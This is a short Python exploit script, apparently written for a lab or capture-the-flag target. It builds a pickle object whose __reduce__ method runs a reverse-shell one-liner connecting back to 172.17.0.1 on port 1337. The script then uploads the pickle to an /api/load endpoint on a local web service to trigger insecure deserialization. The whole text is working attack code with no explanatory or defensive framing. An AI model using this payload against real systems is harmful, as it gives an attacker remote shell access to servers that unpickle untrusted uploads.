import os, pickle, requests

class P(object):
    def __reduce__(self):
        return (os.system,("python3 -c 'import os,pty,socket;s=socket.socket();s.connect((\"172.17.0.1\",1337));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\"sh\")'",))

pickle_payload = pickle.dumps(P())

with open("local_payload.pkl", "wb") as binary_file:
    binary_file.write(pickle_payload)

url = 'http://127.0.0.1:5000'

files = {'file': open('local_payload.pkl', 'rb')}

requests.post(f"{url}/api/load", files=files)
